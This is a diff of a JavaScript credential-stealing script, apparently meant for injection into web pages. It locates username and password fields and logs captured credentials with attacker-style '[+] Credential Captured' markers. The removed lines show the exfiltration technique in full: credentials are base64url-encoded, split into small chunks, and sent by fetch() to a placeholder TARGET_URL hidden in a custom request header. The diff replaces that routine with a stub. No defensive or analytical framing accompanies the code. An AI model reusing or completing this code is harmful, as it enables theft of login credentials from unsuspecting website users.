@@ -1,16 +1,7 @@
-function toBase64Url(str) {
-    const base64 = btoa(unescape(encodeURIComponent(str)));
-
-    // Replace the URL-unsafe characters.
-    return base64
-    .replace(/\+/g, '-') // Replace + with -
-    .replace(/\//g, '_') // Replace / with _
-    .replace(/=/g, '');  // Remove padding =
-}
+const DEBUG = true;
 
 function getCreds() {
-    const debug = false;
-    if (debug) {
+    if (DEBUG) {
         console.log("[*] Looking for credentials...");
     }
 
@@ -49,25 +40,14 @@ function getCreds() {
 
                 // Print results
                 if (password) {
-                    if (debug) {
+                    if (DEBUG) {
                         console.log("[+] Credential Captured");
                         console.log("[>] Username: ", username || "(not found)");
                         console.log("[>] Password: ", password);
                         console.log("[>] Domain: ", window.location.hostname);
                         console.log("[*] Sending credentials...");
-                        console.log("[i] Using target url: ", "TARGET_URL");
-                        console.log("[i] Using exfil header: ", "EXFIL_HEADER");
                     }
-
-                    const payload = toBase64Url(username + ':' + password + '@' + window.location.hostname);
-
-                    if (debug) {console.log('[i] Sending payload:', payload);}
-
-                    const chunks = payload.match(/.{1,6}/g) || [];
-                    chunks.forEach((chunk, index) => {
-                        if (debug) {console.log(`[>] Sending chunk ${index + 1}: "${chunk}"`);}
-                        fetch('TARGET_URL', {headers: {EXFIL_HEADER.replace('{{PAYLOAD}}', chunk)}});
-                    });
+                    // Send data
                 }
             };
 
